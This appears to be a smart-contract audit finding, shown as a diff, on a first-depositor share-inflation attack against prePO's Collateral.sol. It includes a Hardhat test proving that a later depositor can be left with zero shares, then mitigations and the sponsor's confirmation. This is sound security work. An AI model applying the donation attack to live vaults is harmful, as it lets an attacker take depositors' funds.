@@ -1,0 +1,13 @@
+[H-02] First depositor can break minting of shares
+Submitted by GreyArt, also found by 0xDjango, CertoraInc, cmichel, rayn, TomFrenchBlockchain, and WatchPug
+Collateral.sol#L82-L91
+The attack vector and impact is the same asTOB-YEARN-003, where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.
+Proof of Concept
+Attacker deposits 2 wei (so that it is greater than min fee) to mint 1 shareAttacker transfers exorbitant amount to_strategyControllerto greatly inflate the share’s price. Note that the_strategyControllerdeposits its entire balance to the strategy when itsdeposit()function is called.Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.
+it("will cause 0 share issuance",async()=>{// 1. first user deposits 2 wei because 1 wei will be deducted for feeletfirstDepositAmount=ethers.BigNumber.from(2)awaittransferAndApproveForDeposit(user,collateral.address,firstDepositAmount)awaitcollateral.connect(user).deposit(firstDepositAmount)// 2. do huge transfer of 1M to strategy to controller// to greatly inflate share priceawaitbaseToken.transfer(strategyController.address,ethers.utils.parseEther("1000000"));// 3. deployer tries to deposit reasonable amount of 10_000letsubsequentDepositAmount=ethers.utils.parseEther("10000");awaittransferAndApproveForDeposit(deployer,collateral.address,subsequentDepositAmount)awaitcollateral.connect(deployer).deposit(subsequentDepositAmount)// receives 0 shares in returnexpect(awaitcollateral.balanceOf(deployer.address)).to.be.eq(0)});
+Recommended Mitigation Steps
+Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. The same can be done in this case i.e. whentotalSupply() == 0, send the first min liquidity LP tokens to the zero address to enable share dilution.Ensure the number of shares to be minted is non-zero:require(_shares != 0, "zero shares minted");Create a periphery contract that contains a wrapper function that atomically callsinitialize()anddeposit()Calldeposit()once ininitialize()to achieve the same effect as the suggestion above.
+ramenforbreakfast (prePO) confirmed and commented:
+Valid submission, good explanation of the problem and nice to see it being demonstrated via a test case block.
+gzeon (judge) commented:
+Agree with sponsor.
